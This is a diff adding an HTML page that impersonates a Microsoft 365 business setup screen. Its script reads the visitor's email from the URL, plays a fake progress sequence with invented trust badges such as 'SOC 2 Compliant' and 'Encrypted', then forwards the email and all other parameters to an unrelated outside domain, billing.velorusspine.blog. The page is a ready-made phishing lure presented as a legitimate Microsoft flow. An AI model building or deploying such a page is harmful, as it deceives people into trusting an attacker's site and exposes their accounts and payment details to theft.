@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft 365 | Setup</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #f7f9fc 0%, #edf2f7 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            color: #1a202c;
+        }
+
+        .setup-card {
+            width: 100%;
+            max-width: 520px;
+            background: white;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 
+                0 4px 6px rgba(0, 0, 0, 0.05),
+                0 0 1px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(0, 0, 0, 0.05);
+        }
+
+        /* Header */
+        .card-header {
+            background: linear-gradient(90deg, #0078d4 0%, #005aa7 100%);
+            color: white;
+            padding: 28px 32px;
+            position: relative;
+        }
+
+        .card-header h1 {
+            font-size: 22px;
+            font-weight: 500;
+            margin-bottom: 4px;
+            letter-spacing: -0.2px;
+        }
+
+        .card-header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        .header-badge {
+            position: absolute;
+            right: 28px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: rgba(255, 255, 255, 0.2);
+            padding: 6px 12px;
+            border-radius: 16px;
+            font-size: 12px;
+            backdrop-filter: blur(10px);
+        }
+
+        /* Content */
+        .card-content {
+            padding: 32px;
+        }
+
+        /* User Info */
+        .user-card {
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 28px;
+            border-left: 3px solid #0078d4;
+        }
+
+        .user-label {
+            font-size: 11px;
+            color: #0078d4;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 6px;
+        }
+
+        .user-email {
+            font-size: 15px;
+            font-weight: 500;
+            color: #2d3748;
+        }
+
+        /* Progress */
+        .progress-section {
+            margin: 28px 0;
+        }
+
+        .progress-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .progress-label {
+            font-size: 14px;
+            color: #4a5568;
+            font-weight: 500;
+        }
+
+        .progress-percent {
+            font-size: 16px;
+            font-weight: 600;
+            color: #0078d4;
+        }
+
+        .progress-bar {
+            height: 6px;
+            background: #e2e8f0;
+            border-radius: 3px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #0078d4 0%, #00b4ff 100%);
+            border-radius: 3px;
+            transition: width 0.6s ease;
+            position: relative;
+        }
+
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: shimmer 2s infinite;
+        }
+
+        .progress-stats {
+            font-size: 12px;
+            color: #718096;
+            margin-top: 6px;
+            text-align: right;
+        }
+
+        /* Steps */
+        .steps-list {
+            margin: 28px 0;
+        }
+
+        .step-item {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 14px;
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            margin-bottom: 10px;
+            font-size: 14px;
+            transition: all 0.2s ease;
+        }
+
+        .step-item.completed {
+            background: rgba(16, 124, 16, 0.05);
+            border-color: rgba(16, 124, 16, 0.2);
+        }
+
+        .step-item.active {
+            background: rgba(0, 120, 212, 0.08);
+            border-color: #0078d4;
+            box-shadow: 0 0 0 1px rgba(0, 120, 212, 0.1);
+        }
+
+        .step-icon {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 13px;
+            font-weight: 600;
+            flex-shrink: 0;
+        }
+
+        .step-item .step-icon {
+            background: #cbd5e0;
+            color: #718096;
+        }
+
+        .step-item.completed .step-icon {
+            background: #107c10;
+            color: white;
+        }
+
+        .step-item.active .step-icon {
+            background: #0078d4;
+            color: white;
+        }
+
+        .step-content {
+            flex: 1;
+        }
+
+        .step-title {
+            font-weight: 500;
+            color: #2d3748;
+            margin-bottom: 2px;
+        }
+
+        .step-desc {
+            font-size: 12px;
+            color: #718096;
+        }
+
+        /* Status */
+        .status-area {
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 24px 0;
+            text-align: center;
+        }
+
+        .status-line {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: white;
+            padding: 6px 14px;
+            border-radius: 16px;
+            font-size: 14px;
+            color: #4a5568;
+            margin-bottom: 8px;
+        }
+
+        .status-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: #0078d4;
+            animation: blink 1.5s infinite;
+        }
+
+        .status-hint {
+            font-size: 12px;
+            color: #718096;
+        }
+
+        /* Footer */
+        .card-footer {
+            background: #f8fafc;
+            padding: 20px 32px;
+            border-top: 1px solid #e2e8f0;
+            text-align: center;
+        }
+
+        .footer-text {
+            font-size: 12px;
+            color: #718096;
+            line-height: 1.5;
+        }
+
+        .security-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            background: white;
+            border: 1px solid #e2e8f0;
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-size: 11px;
+            margin-bottom: 8px;
+        }
+
+        /* Animations */
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        /* Responsive */
+        @media (max-width: 600px) {
+            .setup-card {
+                margin: 0 12px;
+            }
+            
+            .card-header,
+            .card-content {
+                padding: 24px 20px;
+            }
+            
+            .card-footer {
+                padding: 16px 20px;
+            }
+            
+            .header-badge {
+                position: relative;
+                right: auto;
+                top: auto;
+                transform: none;
+                display: inline-block;
+                margin-top: 10px;
+            }
+            
+            .user-email {
+                font-size: 14px;
+            }
+            
+            .step-item {
+                padding: 12px;
+                font-size: 13px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="setup-card">
+        <!-- Header -->
+        <div class="card-header">
+            <h1>Microsoft 365</h1>
+            <p>Setting up your workspace</p>
+            <div class="header-badge">Business</div>
+        </div>
+
+        <!-- Content -->
+        <div class="card-content">
+            <!-- User Info -->
+            <div class="user-card">
+                <div class="user-label">Active Account</div>
+                <div class="user-email" id="userEmail">Loading...</div>
+            </div>
+
+            <!-- Progress -->
+            <div class="progress-section">
+                <div class="progress-info">
+                    <div class="progress-label">Configuration Progress</div>
+                    <div class="progress-percent" id="progressPercent">0%</div>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <div class="progress-stats" id="progressText">Initializing...</div>
+            </div>
+
+            <!-- Steps -->
+            <div class="steps-list">
+                <div class="step-item completed">
+                    <div class="step-icon">✓</div>
+                    <div class="step-content">
+                        <div class="step-title">Authentication</div>
+                        <div class="step-desc">Account verified</div>
+                    </div>
+                </div>
+
+                <div class="step-item completed">
+                    <div class="step-icon">✓</div>
+                    <div class="step-content">
+                        <div class="step-title">Security Setup</div>
+                        <div class="step-desc">Policies applied</div>
+                    </div>
+                </div>
+
+                <div class="step-item active" id="activeStep">
+                    <div class="step-icon">3</div>
+                    <div class="step-content">
+                        <div class="step-title" id="stepTitle">Services Setup</div>
+                        <div class="step-desc" id="stepDesc">Loading applications</div>
+                    </div>
+                </div>
+
+                <div class="step-item">
+                    <div class="step-icon">4</div>
+                    <div class="step-content">
+                        <div class="step-title">Data Migration</div>
+                        <div class="step-desc">Syncing data</div>
+                    </div>
+                </div>
+
+                <div class="step-item">
+                    <div class="step-icon">5</div>
+                    <div class="step-content">
+                        <div class="step-title">Finalization</div>
+                        <div class="step-desc">Completing setup</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Status -->
+            <div class="status-area">
+                <div class="status-line">
+                    <div class="status-dot"></div>
+                    <span id="currentStatus">Initializing services...</span>
+                </div>
+                <div class="status-hint">Please don't close this window</div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="card-footer">
+            <div class="security-tag">🔐 Encrypted</div>
+            <div class="footer-text">
+                Microsoft Business Cloud • SOC 2 Compliant • 99.9% SLA
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Get URL params
+        const params = new URLSearchParams(window.location.search);
+        const email = params.get('email') || 'user@company.com';
+        document.getElementById('userEmail').textContent = decodeURIComponent(email);
+        
+        // Setup steps
+        const steps = [
+            { title: 'Exchange Online', desc: 'Email services', status: 'Setting up mailbox...', progress: 20 },
+            { title: 'SharePoint', desc: 'Document storage', status: 'Creating sites...', progress: 40 },
+            { title: 'Microsoft Teams', desc: 'Communication', status: 'Configuring teams...', progress: 60 },
+            { title: 'Security Policies', desc: 'Compliance', status: 'Applying policies...', progress: 75 },
+            { title: 'OneDrive', desc: 'Cloud storage', status: 'Setting up storage...', progress: 85 },
+            { title: 'Office Apps', desc: 'Productivity suite', status: 'Installing apps...', progress: 92 },
+            { title: 'Final Checks', desc: 'Verification', status: 'Running checks...', progress: 97 }
+        ];
+        
+        let current = 0;
+        const activeStep = document.getElementById('activeStep');
+        const stepTitle = document.getElementById('stepTitle');
+        const stepDesc = document.getElementById('stepDesc');
+        const statusEl = document.getElementById('currentStatus');
+        const progressFill = document.getElementById('progressFill');
+        const progressPercent = document.getElementById('progressPercent');
+        const progressText = document.getElementById('progressText');
+        
+        function nextStep() {
+            if (current < steps.length) {
+                const step = steps[current];
+                
+                // Update UI
+                stepTitle.textContent = step.title;
+                stepDesc.textContent = step.desc;
+                statusEl.textContent = step.status;
+                progressFill.style.width = step.progress + '%';
+                progressPercent.textContent = step.progress + '%';
+                
+                // Progress text
+                if (step.progress < 30) progressText.textContent = 'Starting...';
+                else if (step.progress < 60) progressText.textContent = 'Configuring...';
+                else if (step.progress < 90) progressText.textContent = 'Finalizing...';
+                else progressText.textContent = 'Completing...';
+                
+                current++;
+                
+                // Schedule next step
+                setTimeout(nextStep, 1200);
+            } else {
+                // Complete
+                stepTitle.textContent = 'Complete';
+                stepDesc.textContent = 'All services ready';
+                statusEl.textContent = 'Workspace ready!';
+                progressFill.style.width = '100%';
+                progressPercent.textContent = '100%';
+                progressText.textContent = 'Ready';
+                
+                // Update step
+                activeStep.classList.remove('active');
+                activeStep.classList.add('completed');
+                activeStep.querySelector('.step-icon').textContent = '✓';
+                
+                // All steps completed
+                document.querySelectorAll('.step-item').forEach(item => {
+                    item.classList.add('completed');
+                    item.querySelector('.step-icon').textContent = '✓';
+                });
+                
+                // Redirect
+                setTimeout(() => {
+                    document.querySelector('.setup-card').style.opacity = '0';
+                    document.querySelector('.setup-card').style.transform = 'scale(0.98)';
+                    document.querySelector('.setup-card').style.transition = 'all 0.4s';
+                    
+                    setTimeout(() => {
+                        const dest = 'https://billing.velorusspine.blog/PnUJrGed';
+                        const final = new URLSearchParams();
+                        
+                        for (const [k, v] of params.entries()) {
+                            final.append(k, v);
+                        }
+                        
+                        final.append('setup', 'done');
+                        final.append('time', Date.now());
+                        final.append('type', 'business');
+                        
+                        window.location.replace(dest + '?' + final.toString());
+                    }, 400);
+                }, 1500);
+            }
+        }
+        
+        // Start
+        setTimeout(nextStep, 800);
+        
+        // Status updates
+        const messages = [
+            'Checking services...',
+            'Validating license...',
+            'Optimizing setup...',
+            'Applying configurations...'
+        ];
+        
+        let msgIndex = 0;
+        setInterval(() => {
+            if (current < steps.length) {
+                statusEl.textContent = messages[msgIndex];
+                msgIndex = (msgIndex + 1) % messages.length;
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
